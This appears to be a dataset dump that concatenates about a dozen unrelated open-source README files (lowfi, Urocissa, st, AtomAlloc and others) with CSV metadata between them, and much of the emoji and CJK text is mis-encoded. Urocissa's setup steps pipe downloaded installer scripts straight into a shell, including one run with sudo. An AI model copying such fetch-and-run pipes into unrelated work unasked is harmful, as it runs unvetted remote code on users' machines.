>
> Custom track lists are going to be pretty particular.
> This is because I still want to keep `lowfi` as simple as possible,
> so custom lists will be very similar to how the built in list functions.
>
> This also means that there will be no added flexibility to these lists,
> so you'll have to work that out on your own.

lowfi also can support custom track lists, although the default one from Lofi Girl
is embedded into the binary.

To use a custom list, use the `--tracks` flag. This can either be a path to some file,
or it could also be the name of a file (without the `.txt` extension) in the data
directory, so on Linux it's `~/.local/share/lowfi`.

For example, `lowfi --tracks minipop` would load `~/.local/share/lowfi/minipop.txt`.
Whereas if you did `lowfi --tracks /home/user/Music/minipop.txt` it would load from that
specified directory.

#### The Format

In Lists, the first line should be the base URL, followed by the rest of the tracks.

Each track will be first appended to the base URL, and then the result use to download
the track. All tracks should end in `.mp3` and as such must be in the MP3 format.

lowfi won't put a `/` between the base & track for added flexibility, so for most cases you
should have a trailing `/` in your base url. The exception to this is if the track name begins
with something like `https://`, where in that case the base will not be prepended to it.

For example, in this list:

```txt
https://lofigirl.com/wp-content/uploads/
2023/06/Foudroie-Finding-The-Edge-V2.mp3
2023/04/2-In-Front-Of-Me.mp3
https://file-examples.com/storage/fea570b16e6703ef79e65b4/2017/11/file_example_MP3_5MG.mp3
```

lowfi would download these three URLs:

- `https://lofigirl.com/wp-content/uploads/2023/06/Foudroie-Finding-The-Edge-V2.mp3`
- `https://file-examples.com/storage/fea570b16e6703ef79e65b4/2017/11/file_example_MP3_5MG.mp3`
- `https://lofigirl.com/wp-content/uploads/2023/04/2-In-Front-Of-Me.mp3`
",14,1,1,MIT,build.yml,15.0
liyao-l-y/check,main,"# ICEÔºöIntrusion Countermeasure Electronics
ICEÔºàIntrusion Countermeasure ElectronicsÔºö‰æµÂÖ•ÂØæÊäóÈõªÂ≠êÊ©üÂô®ÔºâÔºö An Android app environment detection SDK, responsible for countering hooks and collecting risk control environment data.
",0,1,2,GPL-3.0,,0.0
hsa00000/Urocissa,main,"![Ëû¢ÂπïÊì∑ÂèñÁï´Èù¢ 2024-10-17 213036](https://github.com/user-attachments/assets/b8de7937-1916-4b73-9c31-667c7eb1a23d)

# Urocissa

Urocissa is a self-hosted gallery designed to serve massive collections, capable of handling millions of images and videos. It is built using Rust and Vue.

## Table of Contents

- [Motivation](#motivation)
- [Demo](#demo)
- [Advantages](#advantages)
- [Limitations](#limitations)
- [Steps to Set Up and Use the App](#steps-to-set-up-and-use-the-app)
- [Update](#update)

## Motivation

The goal of this project is to efficiently serve one million photos on a 4 GB RAM server, providing smooth scrubbable scrolling, infinite photo streams, and instant search and selection, without waiting for the entire database to load in the browser.

## Demo

‚ö†Ô∏è Demo servers may experience higher latency due to the ongoing [C-LION1 backbone outage](https://status.hetzner.com/incident/ec8a2f28-e964-46cb-94fa-bb4629c19777).

You can explore the features of Urocissa through the following demos:

### Standard Demo

[https://demo.photoserver.tw](https://demo.photoserver.tw)  
**Password:** `password`

This demo showcases the typical usage of Urocissa, allowing you to experience its core features and user interface.

### One-Million-Photo Demo

[https://demo-million.photoserver.tw](https://demo-million.photoserver.tw)  
**Password:** `password`

This demo demonstrates Urocissa's ability to manage 1,000,000 photos, showcasing the power and scalability of Urocissa. Since I don't have access to a million unique images, the photos in this demo are replaced with placeholders.

Both demos are currently in read-only mode, and uploading files or editing tags is not permitted at this time.

## Advantages

- **Blazing Fast Performance**: Index photos with a pure Rust crate. Instantly serve, search, and filter one million photos in under a second using an in-memory cached database.

- **Memory Efficient**: Even with the entire database cached in memory, both the standard demo and the one-million-photo demo can run seamlessly on a single server with just 4 GB of RAM.

- **Infinite Photo Stream**: Experience endless scrolling without pagination. No lazy loading needed. Urocissa uses advanced virtual scrolling to serve one million photos, overcoming the DOM height limit of 33,554,400px (see [TanStack/virtual#616](https://github.com/TanStack/virtual/issues/616)).

- **Instant Data Search**: Use boolean operators such as 'and', 'or', or 'not' to search your data instantly. Find examples of search queries [here](https://github.com/hsa00000/Urocissa/blob/main/SEARCH.md).

## Limitations

**Early Stage Development**: The app is still in its very early development phase. Many features are incomplete, and there are no automated tests. Additionally, Urocissa is currently optimized for Chrome and Firefox on Windows and Android, but it may encounter issues for browsers on iOS or Linux. The detailed features can be seen in this table:

| Feature                    | Status |
| -------------------------- | ------ |
| Upload Videos and Photos   | ‚úÖ     |
| Auto Backup Folders        | ‚úÖ     |
| Download Photos and Videos | ‚úÖ     |
| EXIF Data                  | ‚úÖ     |
| User-Defined Tags          | ‚úÖ     |
| Duplicate Handling         | ‚úÖ     |
| Instant Select All         | ‚úÖ     |
| Find in Timeline           | ‚úÖ     |
| Responsive Layout          | ‚úÖ     |
| Shareable Albums           | üõ†Ô∏è     |
| Basic Editing              | ‚è≥     |
| Multi-User Support         | ‚è≥     |
| Docker Installation        | ‚è≥     |
| Discovery                  | ‚è≥     |
| Object/Face Recognition    | ‚ùå     |
| Geolocation/Map            | ‚ùå     |
| Android App                | ‚ùå     |
| External Libraries         | ‚ùå     |
| Existing Folders           | ‚ùå     |

## Steps to Set Up and Use the App

Follow these steps to set up and run the Urocissa app on Linux-based systems. For instructions on setting up the app on Windows, please refer to [this guide](https://github.com/hsa00000/Urocissa/blob/main/WINDOWS.md).

### 1. Clone the Repository

```bash
git clone https://github.com/hsa00000/Urocissa.git
```

This will create a folder called `./Urocissa`.

---

### 2. Install Dependencies

Make sure the following software is installed on your system:

- **ffmpeg**: Install via APT on Ubuntu:

  ```bash
  sudo apt update && sudo apt install -y ffmpeg
  ```

- **Rust**: Install Rust using the official installer:

  ```bash
  curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
  source $HOME/.cargo/env
  ```

- **npm (Node.js)**: Install Node.js (with npm) from NodeSource:

  ```bash
  curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
  sudo apt install -y nodejs
  ```

---

### 3. Configure Backend Settings

1. Navigate to the backend directory:

   ```bash
   cd ./Urocissa/gallery-backend
   ```

2. Copy the default config file and fill in the necessary settings:

   ```bash
   cp .env.default .env
   cp Rocket.default.toml Rocket.toml
   ```

   **.env:**

   ```env
   PASSWORD=password
   SYNC_PATH=./upload
   DISCORD_HOOK_URL=
   ```

   _Explanation:_

   - `PASSWORD`: Your password for the app.
   - `SYNC_PATH`: List of directories that the app will watch for new or modified photos.
   - `DISCORD_HOOK_URL`: (Optional) Fill in your Discord webhook URL to receive error notifications.

   **Rocket.toml:**

   - `port`: Default is `4000`. You can change this to your desired port number.

---

### 4. Build the Backend

Navigate to `gallery-backend` and build the backend using Cargo:

```bash
cargo build --release
```

---

### 5. Configure Frontend Settings

1. Navigate to the `gallery-frontend` directory:

   ```bash
   cd ./Urocissa/gallery-frontend
   ```

2. Copy the default frontend config file:

   ```bash
   cp config.default.ts config.ts
   ```

   **Note:** The `config.ts` file contains advanced settings. You can leave it unchanged unless you need to customize it.

---

### 6. Build the Frontend

In the `gallery-frontend` directory, run:

```bash
npm run build
```

---

### 7. Run the Application

Navigate to the `gallery-backend` directory and run the following command to start the app:

```bash
cargo run --release
```

You can now access the app via http://127.0.0.1:4000 or http://127.0.0.1:<your_port> if you configured a custom port in Rocket.toml.

## Update

### 1. Pull the Latest Changes from the Repository

Navigate to the project directory and pull the latest updates:

```bash
git pull
```

---

### 2. Rebuild the Frontend

1. Navigate to the `gallery-frontend` directory:

   ```bash
   cd ./Urocissa/gallery-frontend
   ```

2. Build the frontend:

   ```bash
   npm run build
   ```

---

### 3. Rebuild the Backend

1. Navigate to the `gallery-backend` directory:

   ```bash
   cd ./Urocissa/gallery-backend
   ```

2. Build and run the backend using Cargo:

   ```bash
   cargo run --release
   ```

---

After following these steps, your Urocissa app will be updated to the latest version.
",3,0,4,MIT,,3.0
tailcallhq/gh-workflow,main,"# ü¶Ä Rust GitHub Actions Workflow üöÄ

[![Rust](https://img.shields.io/badge/Language-Rust-blue?style=flat-square)](https://www.rust-lang.org)
[![Build Status](https://github.com/tailcallhq/rust-gh-workflow/actions/workflows/ci.yml/badge.svg?style=flat-square)](https://github.com/tailcallhq/rust-gh-workflow/actions)
[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=flat-square)](https://opensource.org/licenses/MIT)
[![Crates.io](https://img.shields.io/crates/v/gh-workflow?style=flat-square)](https://crates.io/crates/gh-workflow)
[![Contributors](https://img.shields.io/github/contributors/tailcallhq/rust-gh-workflow?style=flat-square)](https://github.com/tailcallhq/rust-gh-workflow/graphs/contributors)
[![GitHub forks](https://img.shields.io/github/forks/tailcallhq/rust-gh-workflow?style=flat-square)](https://github.com/tailcallhq/rust-gh-workflow/network/members)
[![Stars](https://img.shields.io/github/stars/tailcallhq/rust-gh-workflow?style=flat-square)](https://github.com/tailcallhq/rust-gh-workflow/stargazers)
[![Issues](https://img.shields.io/github/issues/tailcallhq/rust-gh-workflow?style=flat-square)](https://github.com/tailcallhq/rust-gh-workflow/issues)

## üßë‚Äçüíª What is Rust GitHub Workflows?

**Rust GitHub Workflows** is a library that allows developers to write GitHub Actions in Rust. It empowers you to automate, manage, and improve your CI/CD pipelines in a type-safe manner.

GitHub Actions is powerful, but writing workflows can sometimes feel repetitive, tricky and frustrating with no strict type-checking. That's where **Rust GitHub Workflows** steps in! ü¶æ

- üî• **Rust-Powered**: Leverage the type-safety of Rust for writing workflows.
- üì¶ **Crate-friendly**: Build reusable workflows and publish them as crates.

## üì¶ Installation

To use **Rust GitHub Workflows** in your project, add it to your `Cargo.toml`:

```toml
[build-dependencies]
gh-workflow = ""*"" # Add the latest version
```

Then you can start creating GitHub Actions in your [tests/ci.rs](https://github.com/tailcallhq/rust-gh-workflow/blob/main/tests/ci.rs).

## üë∑ Usage

- Simply add a `tests/ci.rs` file to your project's tests directory.
- Add the following code to generate the GitHub Actions workflow:

  ```rust
  use gh_workflows::*;

  #[test]
  fn main() {
      // Create a basic workflow
      let workflow = Workflow::setup_rust();

      // Generate the ci.yml
      workflow.generate().unwrap();
  }
  ```

  To view a fully functional example, check out the [tests/ci.rs](https://github.com/tailcallhq/rust-gh-workflow/blob/main/tests/ci.rs) of this project.

- Run `cargo test` to generate the GitHub Actions workflow.

## üõ†Ô∏è Roadmap

- [x] Support for Automated Cargo Releases
- [ ] Improve Type Safety of Nightly Builds
- [x] Updates Rust Docs using Github's official documentation for the API

## üí° Why Rust?

Rust provides the perfect combination of speed, safety, and flexibility, making it an ideal choice for writing GitHub Actions. With Rust, you get strong typing, memory safety, and the ability to reuse existing code, which can make your automation scripts more robust and maintainable.

## üìÑ License

This project is licensed under the Apache 2.0 License - see the [LICENSE](LICENSE) file for details.

## üôå Contributors

A big thank you to all the contributors who helped make this project a success! üôè

[![Contributors](https://contrib.rocks/image?repo=tailcallhq/rust-gh-workflow)](https://github.com/tailcallhq/rust-gh-workflow/graphs/contributors)

## üåü Show Your Support

If you like this project, please consider giving it a ‚≠ê on [GitHub](https://github.com/tailcallhq/rust-gh-workflow) and share it with the community!

## üîó Inspiration

This project was inspired by the following repositories:

- [sbt/sbt-github-actions](https://github.com/sbt/sbt-github-actions)
- [emmanuelnk/github-actions-workflow-ts](https://github.com/emmanuelnk/github-actions-workflow-ts)

---

Happy automating with Rust! ü¶Ä‚ù§Ô∏è
",7,6,18,Apache-2.0,ci.yml,46.0
clabby/st,main,"<h1 align=""center"">
   <img src=""./assets/banner.png"" alt=""st"" width=""35%"" align=""center"">
</h1>

<h4 align=""center"">
   Yet another tool for managing stacked PRs locally and on GitHub, built on
   <a href=""https://crates.io/crates/git2""><code>libgit2</code></a>
   and
   <a href=""https://crates.io/crates/octocrab""><code>octocrab</code></a>.
</h4>

<p align=""center"">
  <a href=""https://github.com/clabby/st/actions/workflows/rust_ci.yaml""><img src=""https://github.com/clabby/st/actions/workflows/rust_ci.yaml/badge.svg?label=ci"" alt=""CI""></a>
  <img src=""https://img.shields.io/badge/License-Beerware-green.svg?label=license&labelColor=2a2f35"" alt=""License"">
</p>

<p align=""center"">
  <a href=""#installation"">Installation</a> ‚Ä¢
  <a href=""#what-are-stacked-prs"">What are Stacked PRs?</a> ‚Ä¢
  <a href=""#usage"">Usage</a> ‚Ä¢
  <a href=""#why"">Why?</a> ‚Ä¢
  <a href=""#contributing"">Contributing</a>
</p>

<https://github.com/user-attachments/assets/4aa0d8a3-9876-4d8b-ae23-c0337866a41b>


## Installation

> \[!WARNING\]
> `st` was written on a weekend for my own personal use, and may not be entirely stable. You're welcome to use it
> in its current state, though don't get mad at me if the tool messes up your local tree. I'll remove this warning once
> I feel that it's stable for my own usecase.

You can install `st` with:

```sh
git clone https://github.com/clabby/st && \
   cd st && \
   cargo install --bin st --path . --force
```

## What are Stacked PRs?

[stacking.dev](https://www.stacking.dev/) is a great to-the-point resource.

## Usage

```sh
st is a CLI application for working with stacked PRs locally and on GitHub.

Usage: st [OPTIONS] <COMMAND>

Commands:
  sync      Sync the remote branches with the local branches [aliases: rs, sy]
  submit    Submit the current PR stack to GitHub [aliases: s, ss]
  checkout  Checkout a branch that is tracked with `st` [aliases: co]
  create    Create and track a new branch within the current stack [aliases: c]
  delete    Delete a branch that is tracked with `st` [aliases: d, del]
  restack   Restack the the current stack [aliases: r, sr]
  log       Print a tree of all tracked stacks [aliases: l, ls]
  status    Show the status of the current stack on GitHub [aliases: st, stat]
  track     Track the current branch on top of a tracked stack node [aliases: tr]
  untrack   Untrack the passed branch [aliases: ut]
  config    Configure the st application [aliases: cfg]
  help      Print this message or the help of the given subcommand(s)

Options:
  -v...          Verbosity level (0-4)
  -h, --help     Print help
  -V, --version  Print version
```

## Why?

I'm a long-time user and lover of [Graphite](https://github.com/withgraphite). I never quite used the graphite ecosystem
as intended - only the CLI. My biggest gripe with Graphite is that they decided to disallow opting into the periphery
services that cost them money to operate, making the CLI dependent on their API and unusable in organizations without
paying $99/month (_for 5 seats_).

```text
ERROR: Your team's Graphite plan has expired. To continue using Graphite in <organization>, upgrade your
plan at https://app.graphite.dev/settings/billing?org=<organization>
```

Admittedly, this error message prompted the creation of this project. This tool aims to be dependent only on the
GitHub API, and to contain a minified version of the Graphite CLI's featureset. `st` is not a _service_, it is just a
_tool_. It's also free software - go crazy. If you enjoy using this tool, consider
[buying me a beer if we ever meet](./LICENSE.md).

> \[!NOTE\]
>
> This tool is meant for the common-{wo}man working on open source projects, not for enterprise customers.
>
> If you're looking for a more feature-rich ecosystem for stacked PRs that has a support team,
> andressen-horowitz funding, etc., I do recommend checking out Graphite. They'll actually fix your bugs promptly,
> I might not. The Graphite team is great, and they've built something very special - so much so that `st` emulates its
> featureset. I just wish I could opt-out of the fancy stuff and not pay for work that the GitHub API can do for free!
>
> If you're someone who doesn't care about features like AI code review, web interfaces, etc., and you just want
> to be able to manage PR stacks, this could be the tool for you.

### Why not [`git-branchless`](https://github.com/arxanas/git-branchless)?

Too complicated. The tool is far from focused on PR stacks, with tons of other features. Good tool, not for me. Graphite
feels good because it leads users into the [_pit of success_](https://blog.codinghorror.com/falling-into-the-pit-of-success/).
`git-branchless` is like `git`, in that it has so many features, it's highly likely its users don't even know about
all of them.

### Why not [`charcoal`](https://github.com/danerwilliams/charcoal)?

Very close to what I want, but:

1. Looks unmaintained. It's a fork of the formerly-open-source Graphite without dependencies on the propietary
   and pay-walled Graphite API, which I sung praises for above. However, it doesn't inherit some of the nice new
   features that I enjoy.
2. Doesn't have ergonomic aliases.
3. Doesn't support the comments on GitHub PRs that direct reviewers around the stack.
4. Similar to `graphite`, painfully slow. It's written in TypeScript and pings its API quite a bit, making even
   operations like `gt ls` take > 500ms. I like my CLI tools snappy!

![gt_ls_bench](./assets/gt_ls_bench.png)

### Why not [`spr`](https://github.com/ejoffe/spr)?

Mainly because it's restrictive. I don't like the idea of 1 commit = 1 PR - it makes the workflow feel less fluid.
Again, nice tool, just not for me.

### Why not _yet-another-stacked-pr-tool_

Because I want to control my own destiny. We can end the conversation here...

![standards](./assets/standards.png)

## Contributing

Contributions are welcome. Feel free to [submit an issue](https://github.com/clabby/st/issues/new) or open a PR with
your changes.
",0,8,3,NOASSERTION,rust_ci.yaml,27.0
unisat-wallet/fractal-ordinals-collections,main,"# Ordinals Collections Standards

## Meta Data `meta.json`

```
{
  ""description"": """",
  ""discord_link"": """",
  ""icon"": ""https://"",
  ""name"": """",
  ""slug"": """", # all lowercase or underscore hyphen, consistent with the directory name
  ""twitter_link"": ""https://"",
  ""website_link"": ""https://""
}
```

## Inscription Data `inscriptions.json`

```
[
  {
    ""id"": """",                    # inscription id
    ""meta"": {
      ""name"": """"                 # inscription name
    }
  },
  ...
]
```

Artists can assign unqiue traits to ordinals with `attributes`

```
[
  {
    ""id"": """",
    ""meta"": {
      ""name"": """"
      ""attributes"": [
        {
          ""trait_type"": """",        # trait category
          ""value"": """",             # trait value
        },
        ...
      ]
    }
  },
  ...
]
```

Your inscriptions.json file will look like this:

```
[
  {
    ""id"": ""af0b19432a676551223e300e7197348b7c225cb7b31d0d7c6e246e382cbf6f81i0"",
    ""meta"": {
      ""name"": ""Planetary Ordinal #11"",
      ""attributes"": [
        {
          ""trait_type"": ""Background"",
          ""value"": ""Sun sun"",
        },
        {
          ""trait_type"": ""Holes"",
          ""value"": ""rose blossom"",
        }
      ]
    }
  }
]
```
",0,0,2,MIT,rust.yml,798.0
wong-justin/vic,main,"# vic

Play & cut videos in the terminal

![screenshot](https://github.com/user-attachments/assets/6ea7bceb-4760-45f2-aabf-c7f340219365)

## Building

### Linux

`vic` is dynamically linked with [`chafa`](https://hpjansson.org/chafa/), a C library that makes pretty pictures. To install `chafa`:

```
apt-get install libglib2.0-dev
curl 'https://hpjansson.org/chafa/releases/chafa-1.14.4.tar.xz' -O
tar xf chafa-1.14.4.tar.xz
cd chafa-1.14.4
./configure --without-tools
make
make install
ldconfig
```

Once `chafa` is installed, you can build the Rust project with `cargo build`.

Make sure everything is compiled and linked correctly by running `cargo test`.

You can find the built binary at `target/debug/vic`, or you can use `cargo run` as an alias for `vic`.

`vic` requires [`ffmpeg`](https://ffmpeg.org//download.html) to be on `$PATH` during runtime.

## Static binaries

Coming soon! See [this issue](https://github.com/wong-justin/vic/issues/1#issue-2586904982) if you want to help.

## Usage

```
vic <filepath> [-w <int, default 40>]
               [--hide-controls]
               [--help|--version]
```

### Examples

```
vic video.mp4
vic video.mp4 -w=9999 --hide-controls
vic http://example.com/video.avi -w 20
```

### Options

```
-w <int>          Max output width, in columns.
                  Use -w 9999 for fullscreen.
                  Defaults to 40.

--hide-controls   Hide helper text below the video.
```

### Controls

```
[ segment mode ]

  space ... play/pause
  j/l ..... seek back/forwards
  m ....... make marker
  q ....... finish

[ marker mode ]

  M ....... delete marker
  J/L ..... goto prev/next marker
```

## Notes

Here's a blog post: https://wonger.dev/posts/chafa-ffmpeg-progress

My main focus for now is fiddling with GitHub Actions and building static binaries.

I also need to use an async runtime. Right now, the program gets sluggish with large videos, and it interferes with user input.

Another big task is to add audio.

There's several quality-of-life improvements to work on.

Pull requests welcome :)
",0,3,1,GPL-3.0,test.yml,0.0
apfitzge/solana-transaction-tui,main,"# solana-transaction-tui

Simple TUI app for displaying solana transaction byte format

![simple demonstration](solana-transaction-tui.gif)
",0,0,1,Apache-2.0,,0.0
JesusMiramontes/Heartbeatrr,main,"# Heartbeatrr Project - README

## Project Overview

Heartbeatrr is an easy-to-use service monitoring tool that helps you keep track of the health of your online services. Imagine you have a few websites, applications, or online services that you rely on, and you want to know if any of them go offline or experience issues. Heartbeatrr checks these services regularly and lets you know if something goes wrong.

### Here‚Äôs how it works:

1.	Service Health Monitoring: Heartbeatrr periodically checks the status of different services by ‚Äúpinging‚Äù their URLs to see if they are responding. These services could be websites, APIs, or any other online system that provides a URL for checking availability.
2.	Automatic Alerts: If any of the services fail to respond or return an error, Heartbeatrr immediately sends a notification to your Discord channel. This way, you are promptly informed if something goes wrong without having to manually check everything.
3.	Configurable Timing: You can decide how often you want Heartbeatrr to check the services. For example, it could check them every 30 minutes, every hour, or at any interval that fits your needs. This is done through simple settings that are easy to adjust.
4.	Retry on Failure: Sometimes, services might be temporarily unavailable due to brief issues. Instead of notifying you immediately for every small hiccup, Heartbeatrr can retry the failed services a few times before sending an alert, just to make sure it‚Äôs not a short-term glitch.
5.	Customizable for Your Needs: You can easily tell Heartbeatrr which services to monitor by providing their URLs. It‚Äôs as simple as giving the app a list of web addresses, and it takes care of the rest.

## Who is it for?

Heartbeatrr is ideal for anyone who manages online services and wants to make sure everything is running smoothly without constantly checking manually. Whether you‚Äôre managing a few websites, APIs, or internal tools, Heartbeatrr gives you peace of mind by automatically checking the status of these services and notifying you of any issues.

This app is also great for those who use platforms like Discord for team communication. Instead of getting notifications via email or other channels, you‚Äôll receive real-time alerts directly in your Discord chat, where you can quickly take action.

This simple yet powerful tool automates the health-checking process and keeps you informed, making it an essential part of your service management toolkit.

## Features
	- Periodic health checks for multiple services.
	- Configurable retries for failed health checks.
	- Sends alerts via Discord webhook when a service goes down.
	- Easily deployable using Docker.

## Docker Configuration
The project can be easily deployed using Docker. You need to configure the Docker environment variables to suit your needs. Here‚Äôs a breakdown of the variables you need to configure.

### Environment Variables

	- HEARTBEATRR_CONNECTION_TIMEOUT: Sets the HTTP connection timeout (in milliseconds). This determines how long the system waits for a service to respond before timing out. Example: 3000 (3 seconds).
	- HEARTBEATRR_RETRY_BACKOFF_DELAY: The delay (in milliseconds) between retry attempts when a health check fails. Example: 1000 (1 second).
	- HEARTBEATRR_RETRY_MAX_ATTEMPTS: Sets the maximum number of retry attempts for failed health checks. Example: 3.
	- HEARTBEATRR_HEALTHCHECK_SCHEDULE_DELAY: Delay between scheduled health checks (in seconds). This is how often the system will check the health of services. Example: 1800 (30 minutes).
	- HEARTBEATRR_SERVICES_URLS: A JSON-like object specifying the services to be checked and their URLs. For example: {""Google"":""http://google.com"", ""Yahoo"":""http://yahoo.com""}.
	- HEARTBEATRR_DISCORD_SERVICE_WEBHOOK: The Discord webhook URL to send notifications when services are down. This is required if you want to receive alerts.

## Steps to Run with Docker
1. Configure the docker-compose.yml file with the required services, retries, and Discord webhook.
2. Run the application with Docker Compose:
```bash
docker-compose up -d
```
3. The application will now start running and periodically check the services you‚Äôve configured. If any service is down, you‚Äôll receive a Discord notification.


## For Developers
This section is for developers who want to modify the code, run tests, or contribute to the project.

### Project Structure

The project follows a standard Spring Boot structure:

	‚Ä¢ src/main/java: Contains the application source code.
	‚Ä¢ src/main/resources: Contains application configuration files.
	‚Ä¢ src/test/java: Contains unit and integration tests.

### Building the Project
Make sure you have Maven installed. To build the project:

### Contributing

We welcome contributions to the project! Here‚Äôs how you can contribute:

	1. Fork the repository.
	2. Create a new branch with a descriptive name (git checkout -b feature-branch-name).
	3. Make your changes and test them.
	4. Push your changes to the branch (git push origin feature-branch-name).
	5. Open a Pull Request and describe your changes.

Be sure to follow our coding standards and add proper documentation for any new features.

That‚Äôs it! If you have any questions, feel free to open an issue or reach out for support. Happy monitoring!",0,0,1,Apache-2.0,,0.0
rkrasiuk/metrics-derive,main,"metrics-derive
===============

[![Build Status](https://github.com/rkrasiuk/metrics-derive/actions/workflows/ci.yml/badge.svg)](https://github.com/rkrasiuk/metrics-derive/actions)
[![Crates.io](https://img.shields.io/crates/v/metrics-derive.svg)](https://crates.io/crates/metrics-derive)
[![Documentation](https://docs.rs/metrics-derive/badge.svg)](https://docs.rs/metrics-derive)
[![Rust](https://img.shields.io/badge/rust-1.80.0%2B-blue.svg?maxAge=3600)](https://github.com/rkrasiuk/metrics-derive)

`metrics-derive` provides the `Metrics` derive macro, allowing you to automatically implement metrics description and initialization.

Originally introduced in [`paradigmxyz/reth`](https://github.com/paradigmxyz/reth) repository in https://github.com/paradigmxyz/reth/pull/592.

## Installation

To use `metrics-derive`, add it to your Cargo.toml:

```toml
[dependencies]
metrics-derive = ""0.1""
```

This crate requires a [`metrics`](https://crates.io/crates/metrics) peer dependency.

## Usage

```rust
use metrics::{Counter, Gauge, Histogram};
use metrics_derive::Metrics;

#[derive(Metrics)]
#[metrics(scope = ""metrics_custom"")]
pub struct CustomMetrics {
    /// A gauge with doc comment description.
    gauge: Gauge,
    #[metric(rename = ""second_gauge"", describe = ""A gauge with metric attribute description."")]
    gauge2: Gauge,
    /// Some doc comment
    #[metric(describe = ""Metric attribute description will be preferred over doc comment."")]
    counter: Counter,
    /// A renamed histogram.
    #[metric(rename = ""histogram"")]
    histo: Histogram,
}
```

The example above will be expanded to:
```rust
pub struct CustomMetrics {
    /// A gauge with doc comment description.
    gauge: metrics::Gauge,
    gauge2: metrics::Gauge,
    /// Some doc comment
    counter: metrics::Counter,
    /// A renamed histogram.
    histo: metrics::Histogram,
}

impl Default for CustomMetrics {
    fn default() -> Self {
        Self {
            gauge: metrics::gauge!(""metrics_custom_gauge""),
            gauge2: metrics::gauge!(""metrics_custom_second_gauge""),
            counter: metrics::counter!(""metrics_custom_counter""),
            histo: metrics::histogram!(""metrics_custom_histogram""),
        }
    }
}

impl CustomMetrics {
    /// Describe all exposed metrics
    pub fn describe() {
        metrics::describe_gauge!(
            ""metrics_custom_gauge"",
            ""A gauge with doc comment description.""
        );
        metrics::describe_gauge!(
            ""metrics_custom_second_gauge"",
            ""A gauge with metric attribute description.""
        );
        metrics::describe_counter!(
            ""metrics_custom_counter"",
            ""Metric attribute description will be preferred over doc comment.""
        );
        metrics::describe_histogram!(""metrics_custom_histogram"", ""A renamed histogram."");
    }
}

impl std::fmt::Debug for CustomMetrics {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct(""CustomMetrics"").finish()
    }
}
```
",0,0,1,Apache-2.0,ci.yml,0.0
mekaem/atomalloc,main,"# ‚öõÔ∏è AtomAlloc ‚öõÔ∏è

[![Build](https://github.com/ovnanova/atomalloc/actions/workflows/rust.yml/badge.svg)](https://github.com/ovnanova/atomalloc/actions/workflows/rust.yml) [![Rust](https://img.shields.io/badge/rust-stable-orange.svg)](https://www.rust-lang.org)

An experimental async-first memory allocator exploring atomic & lock-free allocation patterns in Rust.

> **Research Implementation**: This is an experimental allocator focused on exploring async memory management patterns. It is NOT optimized for production use and currently exhibits higher overhead than traditional allocators.

## Overview

AtomAlloc investigates the intersection of async Rust, atomic operations, and memory management by implementing a fully lock-free, task-aware allocator. While performance is not yet competitive with production allocators, it provides insights into async allocation patterns and challenges.

## Design Goals vs Reality

### ‚úÖ Successfully Achieved
- üõ°Ô∏è **Zero Unsafe Code**: Fully safe Rust implementation
- üîì **Lock-Free Design**: Atomic operations throughout
- üíæ **Task Awareness**: Generations and task-local caching
- üîÑ **Async Interface**: Full async/await support

### ‚ùå Current Limitations
- **Performance**: slower than system allocator for common cases
- **Memory Overhead**: higher memory usage due to atomic metadata
- **Cache Efficiency**: poor cache locality from atomic operations
- **Cold Start**: initial allocation overhead from block initialization
- **Compatibility**: incompatible with GlobalAlloc trait or the unstable allocator_api feature

## Usage

If you'd like to experiment with this allocator, download this repo.

Basic usage:

```rust
// Create allocator instance
let alloc = AtomAlloc::new().await;

// Allocation
let layout = Layout::new::<[u8; 1024]>();
let block = alloc.allocate(layout).await?;

// Write data
block.write(0, &[1, 2, 3, 4]).await?;

// Read data
let data = block.read(0, 4).await?;

// Deallocation
alloc.deallocate(block).await;

// Get allocation stats
let stats = alloc.stats().await;
println!(""Cache hit rate: {}%"",
    stats.cache_hits as f64 / (stats.cache_hits + stats.cache_misses) as f64 * 100.0);
```

## Configuration

The allocator can be configured via `AtomAllocConfig`:

```rust
let config = AtomAllocConfig {
    max_memory: 1024 * 1024 * 1024, // 1GB
    max_block_size: 64 * 1024,      // 64KB
    min_block_size: 64,             // 64B
    alignment: 16,
    cache_ttl: Duration::from_secs(300),
    max_caches: 1000,
    initial_pool_size: 1024 * 1024, // 1MB
    zero_on_dealloc: true,
};

let alloc = AtomAlloc::with_config(config).await;
```

## Technical Architecture

### Core Components

```rust
pub struct AtomAlloc {
    pool: Arc<MemoryPool>,
    cache: Arc<BlockCache>,
    block_manager: Arc<BlockManager>,
    stats: Arc<AtomAllocStats>,
    config: Arc<AtomAllocConfig>,
}

pub struct Block {
    state: AtomicU64,      // Packs generation + flags
    size: AtomicUsize,     // Block size
    data: Box<[AtomicU8]>, // Actual memory storage
}
```

### Memory Model

Allocation follows a three-tier hierarchy:
1. Block Cache with Hot/Cold Queues
2. Size Class Pool with Power-of-2 Classes
3. Global Memory Pool

Each level uses atomic operations and lock-free data structures for synchronization.

### Generation Safety

```rust
impl BlockManager {
    pub async fn verify_generation(&self, block: &Pin<Arc<Block>>) -> Result<(), AtomAllocError> {
        let block_gen = block.generation();
        let current_gen = self.current_generation.load(Ordering::Acquire);

        if block_gen > current_gen {
            return Err(AtomAllocError::BlockError(BlockError::InvalidGeneration {
                block: block_gen,
                expected: current_gen,
            }));
        }
        Ok(())
    }
}
```

Memory safety is enforced through a generation system that tracks block validity.

## Critical Implementation Challenges

### 1. Cache Efficiency

The block cache implements a hot/cold queue system to balance reuse and memory pressure:

```rust
pub struct BlockCache {
    manager: Arc<BlockManager>,
    pool: Arc<MemoryPool>,
    size_classes: Vec<Arc<SizeClass>>,
    stats: Arc<AtomAllocStats>,
}
```

### 2. Memory Ordering

Ensuring correct ordering without locks requires careful atomic operations:

```rust
pub struct Block {
    pub async fn write(&self, offset: usize, data: &[u8]) -> Result<(), BlockError> {
        let size = self.size.load(Ordering::Acquire);
        // Atomic writes with proper ordering
        self.state.fetch_and(!ZEROED_FLAG, Ordering::Release);
        Ok(())
    }
}
```

### 3. Zero-on-Free Overhead

Memory zeroing for security has performance implications:

```rust
async fn zero_block(&self, block: &Pin<Arc<Block>>) {
    if self.config.zero_on_dealloc {
        block.clear().await;
    }
}
```

## Further Improvements

Current areas of investigation:
1. Cache-friendly atomic operations
2. Improved size class distribution
3. Memory coalescing techniques
4. Alternative cache hierarchies
